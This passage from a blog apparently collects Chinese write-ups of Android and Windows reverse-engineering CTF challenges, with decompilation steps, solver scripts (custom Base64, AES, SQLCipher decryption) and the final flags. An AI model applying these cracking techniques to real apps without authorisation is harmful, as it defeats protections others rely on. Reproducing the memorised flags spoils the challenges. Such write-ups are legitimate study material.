sub_401220(flag[5], 1)\nv20 = mul_401100(v19, 1000000000)\nv21 = add_401000(v20, 55)\nflag[5]=sub_401220(v21, 3)\nv22 = mul_401100(flag[6], 1000000)\nv23 = sub_401220(v22, 999975)\nflag[6]=mul_401100(v23, 4)\nv24 = add_401000(flag[7], 55)\nv25 = sub_401220(v24, 33)\nv26 = add_401000(v25, 44)\nflag[7]=sub_401220(v26, 11)\nv27 = mul_401100(flag[8], 10)\nv28 = sub_401220(v27, 5)\nv29 = mul_401100(v28, 8)\nflag[8]=add_401000(v29, 9)\nv30 = add_401000(flag[9], 0)\nv31 = sub_401220(v30, 0)\nv32 = add_401000(v31, 11)\nv33 = sub_401220(v32, 11)\nflag[9]=add_401000(v33, 53)\nv34 = add_401000(flag[10], 49)\nv35 = sub_401220(v34, 2)\nv36 = add_401000(v35, 4)\nflag[10]=sub_401220(v36, 2)\nv37 = mul_401100(flag[11], 1000000)\nv38 = sub_401220(v37, 999999)\nv39 = mul_401100(v38, 4)\nflag[11]=add_401000(v39, 50)\nv40 = add_401000(flag[12], 1)\nv41 = add_401000(v40, 1)\nv42 = add_401000(v41, 1)\nv43 = add_401000(v42, 1)\nv44 = add_401000(v43, 1)\nv45 = add_401000(v44, 1)\nv46 = add_401000(v45, 10)\nflag[12]=add_401000(v46, 32)\nv47 = mul_401100(flag[13], 10)\nv48 = sub_401220(v47, 5)\nv49 = mul_401100(v48, 8)\nv50 = add_401000(v49, 9)\nflag[13]=add_401000(v50, 48)\nv51 = sub_401220(flag[14], 1)\nv52 = mul_401100(v51, -294967296)\nv53 = add_401000(v52, 55)\nflag[14]=sub_401220(v53, 3)\nv54 = add_401000(flag[15], 1)\nv55 = add_401000(v54, 2)\nv56 = add_401000(v55, 3)\nv57 = add_401000(v56, 4)\nv58 = add_401000(v57, 5)\nv59 = add_401000(v58, 6)\nv60 = add_401000(v59, 7)\nflag[15]=add_401000(v60, 20)\nv61 = mul_401100(flag[16], 10)\nv62 = sub_401220(v61, 5)\nv63 = mul_401100(v62, 8)\nv64 = add_401000(v63, 9)\nflag[16]=add_401000(v64, 48)\nv65 = add_401000(flag[17], 7)\nv66 = add_401000(v65, 6)\nv67 = add_401000(v66, 5)\nv68 = add_401000(v67, 4)\nv69 = add_401000(v68, 3)\nv70 = add_401000(v69, 2)\nv71 = add_401000(v70, 1)\nflag[17]=add_401000(v71, 20)\nv72 = add_401000(flag[18], 7)\nv73 = add_401000(v72, 2)\nv74 = add_401000(v73, 4)\nv75 = add_401000(v74, 3)\nv76 = add_401000(v75, 6)\nv77 = add_401000(v76, 5)\nv78 = add_401000(v77, 1)\nflag[18]=add_401000(v78, 20)\nv79 = mul_401100(flag[19], 1000000)\nv80 = sub_401220(v79, 999999)\nv81 = mul_401100(v80, 4)\nv82 = add_401000(v81, 50)\nflag[19]=sub_401220(v82, 1)\nv83 = sub_401220(flag[20], 1)\nv84 = mul_401100(v83, -294967296)\nv85 = add_401000(v84, 49)\nflag[20]=sub_401220(v85, 1)\nv86 = sub_401220(flag[21], 1)\nv87 = mul_401100(v86, 1000000000)\nv88 = add_401000(v87, 54)\nv89 = sub_401220(v88, 1)\nv90 = add_401000(v89, 1000000000)\nflag[21]=sub_401220(v90, 1000000000)\nv91 = add_401000(flag[22], 49)\nv92 = sub_401220(v91, 1)\nv93 = add_401000(v92, 2)\nflag[22]=sub_401220(v93, 1)\nv94 = mul_401100(flag[23], 10)\nv95 = sub_401220(v94, 5)\nv96 = mul_401100(v95, 8)\nv97 = add_401000(v96, 9)\nflag[23]=add_401000(v97, 48)\nv98 = add_401000(flag[24], 1)\nv99 = add_401000(v98, 3)\nv100 = add_401000(v99, 3)\nv101 = add_401000(v100, 3)\nv102 = add_401000(v101, 6)\nv103 = add_401000(v102, 6)\nv104 = add_401000(v103, 6)\nflag[24]=add_401000(v104, 20)\nv105 = add_401000(flag[25], 55)\nv106 = sub_401220(v105, 33)\nv107 = add_401000(v106, 44)\nv108 = sub_401220(v107, 11)\nflag[25]=add_401000(v108, 42)\nflag[26]=add_401000(flag[26], flag[25])\nflag[27]=add_401000(flag[27], flag[12])\nv109 = flag[27]\nv110 = sub_401220(flag[28], 1)\nv111 = add_401000(v110, v109)\nflag[28]=sub_401220(v111, 1)\nv112 = flag[23]\nv113 = sub_401220(flag[29], 1)\nv114 = mul_401100(v113, 1000000)\nflag[29]=add_401000(v114, v112)\nv115 = flag[27]\nv116 = add_401000(flag[30], 1)\nflag[30]=mul_401100(v116, v115)\nflag[31]=add_401000(flag[31], flag[30])\nprint(\"CTF{\"+''.join(map(chr,flag))+\"}\")\n'''\nYour flag is:\nCTF{daf8f4d816261a41a115052a1bc21ade}\n'''\n```\n\n# 3. easyre-153\n\n查壳，UPX壳，拖进Ubuntu输入脱壳命令直接脱掉。\n\n{% asset_img 3.1.png UPX脱壳 %}\n\nhttps://blog.csdn.net/xiao__1bai/article/details/120360202","categories":["Windows逆向"],"tags":["Reverse","OllyDbg","x64dbg"]},{"title":"攻防世界 Android逆向合集","url":"/posts/9f62af2.html","content":"\n# 1. app1\n\n这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。\n\n{% asset_img 1.1.png jeb分析 %}\n\n<!--more-->\n\n```java\npackage v5le0n9;\npublic class demo {\n    public static void main(String[] args){\n    \tString v3 = \"X<cP[?PHNB<P?aj\";\n    \tint len = v3.length();\n    \tint v4 = 15;\n    \tint v0;\n    \tint[] v5 = new int[len];\n    \tfor(v0=0; v0<len; v0++)\n    \t{\n    \t    v5[v0] = v3.charAt(v0) ^ v4;\n    \t    System.out.printf(\"%c\",v5[v0]);\n    \t}\n    }\n}\n/**\nW3l_T0_GAM3_0ne\n*/\n```\n\n# 2. app2\n\n{% asset_img 2.1.png 运行程序 %}\n\n载入AK由so文件，程序可动态调试。载入jeb查看Java源码。\n\n{% asset_img 2.2.png jeb分析 %}\n\n{% asset_img 2.3.png Logcat %}\n\n{% asset_img 2.4.png Logcat %}\n\n{% asset_img 2.5.png jeb分析 %}\n\n将x86目录下的so文件载入IDA32，在Exports表里找到`doRawData`函数，查看伪代码。\n\n{% asset_img 2.6.png IDA分析 %}\n\npython3解决from Crypto.Cipher import AES报错问题：https://www.dandelioncloud.cn/article/details/1018083534028833 \n\n```python\nimport base64\nfrom Crypto.Cipher import AES\ncipher=base64.b64decode(\"VEIzd/V2UPYNdn/bxH3Xig==\")\nkey = \"thisisatestkey==\".encode(\"utf-8\")\naes = AES.new(key,AES.MODE_ECB)\nmsg = aes.decrypt(cipher)\nprint(msg.decode(\"utf-8\"))\n'''\naimagetencent\u0003\u0003\u0003\n'''\n```\n\n发现这个也不是flag。再分析一下XML文件。还有`FileDataActivity`我们还没有分析。\n\n{% asset_img 2.7.png jeb分析 %}\n\n```python\nimport base64\nfrom Crypto.Cipher import AES\ncipher=base64.b64decode(\"9YuQ2dk8CSaCe7DTAmaqAA==\")\nkey = \"thisisatestkey==\".encode(\"utf-8\")\naes = AES.new(key,AES.MODE_ECB)\nmsg = aes.decrypt(cipher)\nprint(msg.decode(\"utf-8\"))\n'''\nCas3_0f_A_CAK3\n'''\n```\n\n所以这题到底怎么转换到`FileDataActivity`去的，迷惑。\n\n# 3. app3\n\n下载下来是一个`.ab`文件，`.ab`文件是 Android 系统的备份文件格式，它分为加密和未加密两种类型。`.ab`文件的前 24 个字节是类似文件头的东西，如果是加密的，在前 24 个字节中会有 AES-256 的标志，如果未加密，则在前 24 个字节中会有 none 的标志。\n\n{% asset_img 3.1.png 文件头 %}\n\n下载`abe.jar`，将`.ab`文件解压。在abe目录下运行cmd。\n\n```\njava -jar abe.jar unpack C:\\Users\\dell\\Desktop\\app3.ab app3.tar\n```\n\n`.tar`文件在Windows也可解压。找到`.apk`文件安装到模拟器，又运行不了。\n\n{% asset_img 3.2.png jeb分析 %}\n\n{% asset_img 3.3.png jeb分析 %}\n\n因为没有跳转语句，无论输入什么都是出来这句话。再看看有什么隐藏的`<activity>`，发现也只有我们分析过的那两个。\n\n{% asset_img 3.4.png jeb分析 %}\n\n再去那两个`<activity>`仔细分析我们刚才没有分析的，肯定是有什么遗漏了。\n\n{% asset_img 3.5.png jeb分析 %}\n\n{% asset_img 3.6.png jeb分析 %}\n\n{% asset_img 3.7.png jeb分析 %}\n\n{% asset_img 3.8.png jeb分析 %}\n\n{% asset_img 3.9.png jeb分析 %}\n\n{% asset_img 3.10.png jeb分析 %}\n\n{% asset_img 3.11.png jeb分析 %}\n\n{% asset_img 3.12.png jeb分析 %}\n\n{% asset_img 3.13.png jeb分析 %}\n\n{% asset_img 3.14.png jeb分析 %}\n\n{% asset_img 3.15.png jeb分析 %}\n\nSHA1=\"Stra1234\" + \"44e2e4457d4e252ca5b9fe9d20b3fea5\" + \"yaphetshan\"= ae56f99638285eb0743d8bf76d2b0c80e5cbb096，取前7位就是ae56f99。\n\n我们刚才说的有加密，是用SqlCipher加密的，而这个就是数据库的密码。\n\n解压包除`.apk`文件之外，还有两个`.db`文件，一个`Demo.db`，另一个是`Encrypt.db`，因为在Java代码里面是`Demo.db`，所以解密也应该是解密这一个。\n\n安装sqlcipher用来解密数据库，上面分析写着版本为`3.4.0`，Linux注意对应版本，Windows下载最新也就`3.0.1`，所以没问题。\n\n```\nE:\\sqlcipher-3.0.1\\bin>sqlcipher-shell64.exe Demo.db\nsqlite> PRAGMA key = \"ae56f99\";\nsqlite> ATTACH DATABASE 'app3_1.db' AS plaintext KEY \"\";\nsqlite> SELECT sqlcipher_export(\"plaintext\");\n\nsqlite> DETACH DATABASE plaintext;\nsqlite>\n```\n\n安装SQLite数据库：https://nightlies.sqlitebrowser.org/latest/ \n\nSQLite用来打开解密后的`.db`文件，加密的`.db`文件SQLite打不开，也就是为什么我们要解密数据库的原因。\n\n{% asset_img 3.16.png 数据库 %}\n\n结果不是...那我们再试试`Encryto.db`。\n\n{% asset_img 3.17.png 数据库 %}\n\n很明显的Base64，拿去解码得：\n\n```\nVGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=\n\nTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}\n```\n\n# 4. easy_apk\n\n{% asset_img 4.1.png 运行程序 %}\n\n载入AK没发现lib文件，载入jeb查看源码：\n\n{% asset_img 4.2.png jeb分析 %}\n\n天真的我就拿去Base64解码了，结果解码失败。回来再看，它是新Base64，点进去查看它的算法，发现它是把索引表给替换了。\n\n拿Base64变种脚本替换索引表即可。\n\n```python\nimport base64\nimport string\n# base 字符集\n# base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\nbase64_charset = \"vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： 05397c42f9b6da593a3644162d36eb01\n'''\n```\n\n```\nflag{05397c42f9b6da593a3644162d36eb01}\n```\n\n# 5. RememberOther\n\n运行一下程序。\n\n{% asset_img 5.1.png 运行程序 %}\n\n拿去AK，没有看到需要动态调试的so文件。\n\n拿去jeb分析代码：\n\n{% asset_img 5.2.png jeb分析 %}\n\n{% asset_img 5.3.png jeb分析 %}\n\n那我们试试直接点注册。\n\n{% asset_img 5.4.png 出现MD5值 %}\n\nMD5的奇数位为`b216ebb92fa5caf6`，再将MD5值解密，解出来为`YOU_KNOW_`(究竟哪个网站可以免费解MD5，我还是看牛牛们的wp才知道是这个答案)。拿到程序去验证没错。`YOU_KNOW_`很明显是flag形式，后面还缺了些东西，出题人给了剩下的线索。\n\n{% asset_img 5.5.png 线索 %}\n\n你懂！你懂安卓！\n\n```\nYOU_KNOW_ANDROID\n```\n\n# 6. easyjni\n\n这道题看名字就知道考察jni。\n\n{% asset_img 6.1.png 运行程序 %}\n\n载入AK，看到lib目录下有`libnative.so`文件，是armeabi-v7a架构的。载入jeb，代码混淆了，没关系一个个方法分析。\n\n在判断语句，调用了MainActivity.a方法，其中一个实参就是我们输入的内容。MainActivity.a方法返回到私有a方法里，形参是我们输入的内容。再看私有a方法，调用了ncheck()方法。\n\n{% asset_img 6.2.png jeb分析 %}\n\n调用ncheck()方法前，还创建了一个a类对象，先进去看看a类的a方法。发现是变种Base64加密。\n\n{% asset_img 6.3.png jeb分析 %}\n\n将apk文件解包，将里面的so文件载入IDA。\n\n```\nC:\\Users\\dell\\Desktop>apktool d easyjni.apk\nI: Using Apktool 2.6.1 on easyjni.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: C:\\Users\\dell\\AppData\\Local\\apktool\\framework\\1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n在Export模块找到ncheck()方法。\n\n{% asset_img 6.4.png IDA分析 %}\n\n{% asset_img 6.5.png IDA分析 %}\n\n哇这就有点恶心人了哈，我从没见过等号在中间的。仔细分析一下IDA源码，原来不过如此。\n\n{% asset_img 6.6.png IDA分析 %}\n\n```\nMbT3sQgX039i3g==AQOoMQFPskB1Bsc7\n\n# i和i+1对换\nbM3TQsXg30i9g3==QAoOQMPFks1BsB7c\n\n# 前16位与后16位对换\nQAoOQMPFks1BsB7cbM3TQsXg30i9g3==\n```\n\n再用4中的变种Base64脚本解决。\n\n```python\nimport base64\nimport string\n# base 字符集\n# base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\nbase64_charset = \"i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"QAoOQMPFks1BsB7cbM3TQsXg30i9g3==\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： flag{just_ANot#er_@p3}\n'''\n```\n\n# 7. easy-so\n\n运行程序。\n\n{% asset_img 7.1.png 运行程序 %}\n\n看题目，肯定有so文件，载入AK发现4种架构都有，可以快乐地玩耍了。\n\n载入jeb分析源码。\n\n{% asset_img 7.2.png jeb分析 %}\n\n{% asset_img 7.3.png jeb分析 %}\n\n我们需要做的就是将CheckString方法的返回值为1。解包，用x86架构的so文件载入IDA。因为我用的模拟器是x86架构的。\n\n{% asset_img 7.4.png IDA分析 %}\n\n这个与6的题目考点几乎一模一样，只是没了变种Base64的过程。\n\n```\nf72c5a36569418a20907b55be5bf95ad\n\n# i与i+1对换\n7fc2a5636549812a90705bb55efb59da\n\n# 前16位与后16位对换\n90705bb55efb59da7fc2a5636549812a\n```\n\n拿去程序里运行验证一下，验证通过。\n\n{% asset_img 7.5.png 验证通过 %}\n\n```\nflag{90705bb55efb59da7fc2a5636549812a}\n```\n\n# 8. easyjava\n\n运行一下程序。\n\n{% asset_img 8.1.png 运行程序 %}\n\n载入jeb分析：\n\n{% asset_img 8.2.png jeb分析 %}\n\n将b类和a类所有方法都分析一遍，反正后面也要用到。\n\n{% asset_img 8.3.png b类 %}\n\n{% asset_img 8.4.png b类 %}\n\n{% asset_img 8.5.png a类 %}\n\n{% asset_img 8.6.png a类 %}\n\n回到MainActivity类，b.b和a.a的作用一样，都是以参数为边界，对换各自的c整形列表，所以v4和v5都应该是对换后的列表。经过分析a类和b类发现并没有增加或减少原本的长度，所以v2的长度就应该等于v3的长度，v3的长度从字符串中可以计算到是12，所以循环要经历12次。\n\n以v2索引值为0的值为例，将v2索引值为0的值传入b.a方法，如果这个值可以转换成小写字母，则把b.b小写字母表中相同的小写字母的索引值取出，与a列表(也就是v4)的数组元素对比，如果取出的索引值与a列表中某个元素相同，则返回元素的索引值。更新b.a列表和b.b小写字母表，都是首位放最末位。将返回的a列表元素的索引值作为参数传入a.a方法，如果这个形参与a列表中(也就是v5)的元素相同，取出这个元素的索引值，作为a.b小写字母表中的索引，返回该索引的元素，也就是“w”。\n\n用Python写出来相当于`a_alphabet[v5.index(v4.index(b_alphabet.index(ans[0])))] = w`\n\n现在我们要做的就是把这个过程逆回来。\n\n```python\nv4 = [17,23,7,22,1,16,6,9,21,0,15,5,10,18,2,24,4,11,3,14,19,12,20,13,8,25]\nv5 = [21,4,24,25,20,5,15,9,17,6,13,3,18,12,10,19,0,22,2,11,23,1,8,7,14,16]\nflag = \"wigwrkaugala\"\nans = \"\"\nb_alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']\na_alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']\nfor i in flag:\n    halflag = a_alphabet.index(i)\n    ans += b_alphabet[v4[v5[halflag]]]\n    temp = v4[0]\n    v4.pop(0)\n    v4.append(temp)\n    temp = b_alphabet[0]\n    b_alphabet.pop(0)\n    b_alphabet.append(temp)\nprint(ans)\n'''\nvenividivkcr\n'''\n```\n\n{% asset_img 8.7.png 运行成功 %}\n\n嘤嘤嘤终于成功了，在做的时候看漏了很多细节，所以正确的flag一直出不来，还是要耐心一点！\n\n```\nflag{venividivkcr}\n```\n\n# 9. Ph0en1x-100\n\n{% asset_img 9.1.png 运行程序 %}\n\n载入AK，看到有lib文件。载入jeb分析源码。\n\n{% asset_img 9.2.png jeb分析 %}\n\n而getFlag和encrypt都是Native方法，需要在so文件查看详细内容。将程序解包，拿x86目录下的so文件载入IDA，查看getFlag和encrypt方法。\n\nencrypt方法就是将输入的字符串中的每个字符的ASCII码都减1。\n\n{% asset_img 9.3.png IDA分析 %}\n\ngetFlag方法看得就有点懵逼了，如果静态分析是在困难的话，可以考虑动态调试。\n\n{% asset_img 9.4.png IDA分析 %}\n\n动态调试需要满足`android:debuggable=\"true\"`，没有就要在AK中编辑添加，重新编译签名。\n\n动态调试方法可看 https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81 我就在这偷下懒了。\n\n刚才静态分析中，很明显看到一个循环，那我们就在循环的下一句下断点，在程序中输入字符串点击按钮，IDA停在断点处。此时，查看寄存器窗口EDI的值，点击小箭头，跟随地址。\n\n{% asset_img 9.5.png IDA动态调试 %}\n\n{% asset_img 9.6.png IDA动态调试 %}\n\n到了这里还没行，循环解决了但getFlag方法还未结束。F8步过观察字符串的变化。运行到快要结束时字符串已经不再变化了。在F8步过的过程中，发现`.`变成了`e`。所以正确的getFlag的返回值应该为：\n\n```\nek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|\n```\n\n所以我们输入的字符串中每个字符-1就是上面这个字符串。编写脚本：\n\n```python\nflag = \"ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|\"\nans = \"\"\nfor i in flag:\n    ans += chr(ord(i) + 1)\nprint(ans)\n'''\nflag{Ar3_y0u_go1nG_70_scarborough_Fair}\n'''\n```\n\n# 10. 黑客精神\n\n运行程序，注册码保存后直接退出。\n\n{% asset_img 10.1.png 运行程序 %}\n\n载入AK，有so文件，因为没有x86目录，如果要动态调试的话就要开我那个慢得要死的AS原生模拟器了。\n\n载入jeb，分析源码：\n\n{% asset_img 10.2.png jeb分析 %}\n\n{% asset_img 10.3.png jeb分析 %}\n\n{% asset_img 10.4.png jeb分析 %}\n\n{% asset_img 10.5.png jeb分析 %}\n\n看到有Log语句，赶紧打开AS连接上模拟器运行一下看看Log。程序一进去就显示m=0，然后再m=Xman。\n\n{% asset_img 10.6.png AS中Logcat窗口 %}\n\n说明程序在打开窗口前就已经载入so文件读取m的值，但它是静态的，如果我们注册过的话，程序会读取m=1，不会让我们再次注册。so文件的onCreate方法中，第一句就是初始化SN，所以m的值应该是在native方法initSN中存着。\n\n将so文件载入IDA，在导出表里找不到initSN方法，也找不到所有native方法，但看到了JNI_Onload，说明整个过程都是在JNI_Onload里动态完成的。\n\n{% asset_img 10.7.png IDAExport表 %}\n\n点进JNI_Onload函数，查看源码：\n\n{% asset_img 10.8.png IDA分析 %}\n\n{% asset_img 10.9.png IDA分析 %}\n\n{% asset_img 10.10.png IDA分析 %}\n\n所以`EoPAoY62@ElRD`应该就是注册码，但输入发现不对...Logcat窗口还是显示m=0。\n\n那继续分析saveSN。\n\n{% asset_img 10.11.png IDA分析 %}\n\n现在可以捋一下思路了，`W3_arE_whO_we_ARE`是要加密的字符串，`EoPAoY62@ElRD`相当于密钥，作为参数传入saveSN。v7存着的就是密钥。\n\n把这个加密算法用Python写一遍：\n\n```python\nflag = \"W3_arE_whO_we_ARE\"\nflagarr = list(flag)\nkey = \"EoPAoY62@ElRD\"\nkeyarr = list(key)\nans = \"\"\nv9 = 2016\nfor i in range(13):\n    if (i%3 == 1):\n        v9 = (v9 + 5) % 16\n        v11 = flagarr[v9 + 1]\n    elif i%3 == 2:\n        v9 = (v9 + 7) % 15\n        v11 = flagarr[v9 + 2]\n    else:\n        v9 = (v9 + 3) % 13\n        v11 = flagarr[v9 + 3]\n    ans += chr(ord(keyarr[i]) ^ ord(v11))\nprint(ans)\n'''\n201608Am!2333\n'''\n```\n\n最后一个work方法，查看它的内存，里面包含着flag的格式。\n\n{% asset_img 10.12.png IDA分析 %}\n\n```\nxman{201608Am!2333}\n```\n\n# 11. APK逆向\n\n同Bugku的mobile1。https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1 \n\n# 12. 人民的名义-抓捕赵德汉1-200\n\n下载下来的是jar包，使用命令`jar -xvf 1-200.jar`解压jar包。\n\n```\nC:\\Users\\dell\\Desktop>jar -xvf 1-200.jar\n  已解压: META-INF/MANIFEST.MF\n  已解压: CheckPassword.class\n  已解压: CheckInterface.class\n  已解压: ClassEnc\n  已解压: .project\n  已解压: .classpath\n  已解压: newClassName.class\n```\n\n在AS或eclipse中创建一个项目，将jar包中的`.class`文件放到项目的class目录下即可查看源码。\n\n{% asset_img 12.2.png 查看源码 %}\n\n{% asset_img 12.3.png 查看源码 %}\n\n{% asset_img 12.1.png 查看源码 %}\n\n{% asset_img 12.4.png 查看源码 %}\n\n这个MD5解出来是`monkey99`，拿去试了一下，发现flag就是这个。\n\n```\nflag{monkey99}\n```\n\n# 13. 基础android\n\n{% asset_img 13.1.png 运行程序 %}\n\n载入AK没什么发现，载入jeb分析源码。\n\n{% asset_img 13.2.png jeb分析 %}\n\n{% asset_img 13.3.png jeb分析 %}\n\n```python\nimport string\nbase = string.ascii_uppercase + string.ascii_lowercase + string.digits + \"-+_<>?/\\|{}()!@#$%^&*~`\"\nlen = 12\nans = \"\"\nfor i in range(len):\n    for j in base:\n        s1 = 255-i-100-ord(j)\n        if s1 == 48:\n            ans += j\nprint (ans)\n'''\nkjihgfedcba`\n'''\n```\n\n拿到密码后继续去到第二关。\n\n{% asset_img 13.4.png jeb分析 %}\n\n那就再看看这个程序还开了哪个类我们还没有分析。`GetAndChange`和`NextContent`我们还没有分析，进去看看。\n\n{% asset_img 13.5.png jeb分析 %}\n\n{% asset_img 13.6.png jeb分析 %}\n\n{% asset_img 13.7.png jeb分析 %}\n\n之后再也没有任何操作了，我们已经看到图片了，所以`NextContent`不是关键类。返回到`GetAndChange`类，找一下`BroadcastReceiver`是干什么用的。\n\n`BroadcastReceiver`详解：https://blog.csdn.net/huiblog/article/details/53234544 \n\n{% asset_img 13.8.png croadcastreceier静态注册 %}\n\n回到`Manifest`发现果然有静态注册。\n\n{% asset_img 13.9.png 静态注册 %}\n\n将`android.is.very.fun`作为显示码输入，但我点击按钮没有任何反应...但是之前不是分析`time_2.zip`转换为图片嘛，直接解压不行，因为它本来就不是zip压缩包。所以将后缀名修改为jpg就可以看到图片了。\n\n{% asset_img 13.11.png jfif %}\n\n{% asset_img 13.10.png flag %}\n\n```\nflag{08067-wlecome}\n```\n\n# 14. easy-dex\n\n在模拟器运行，点一下屏幕就一直在闪，五颜六色地闪。\n\n载入AK，没有找到smali文件，但有一个so文件。并且在`AndroidManifest.xml`文件中能看到有两个丢失的但程序需要的smali文件。`MainActivity`和`NativeActivity`。`MainActivity`大家都知道啦，一般是安卓程序的入口。但我们发现这个程序的入口是`NativeActivity`，这个是什么呢？\n\n{% asset_img 14.4.png 两个smali文件 %}\n\n写android纯c++的程序需要用到`NativeActivity`，这个`NativeActivity`就是一个一般的java类， 和普通的activity没有区别。`NativeActivity` 是android sdk自带的一个activity。android的纯c++的程序也是需要一个java虚拟机来运行的。`NativeActivity`通过`native_app_glu`来启动我们的c++线程，传递各种activity事件给c++代码。`native_app_glu`在ndk的`sources\\android`目录里面，将`native_app_glu`当作我们工程的静态库，这个静态库里面封装好了，会创建一个线程，这个线程里面会调用一个`android_main(android_app* pApplication)`的函数，因此，我们c++这边的入口函数就是`android_main()`。我们在这个`android_main()`函数里面的任务就是进行消息循环，做各种任务。\n\n解包，载入IDA查看so文件。找到`android_main`函数，点进去。\n\n{% asset_img 14.1.png IDA分析 %}\n\n也就是说要在10s内要摇100次手机。\n\n{% asset_img 14.2.png IDA分析 %}\n\n{% asset_img 14.3.png IDA分析 %}\n\n看了个大概，再详细分析代码。\n\n{% 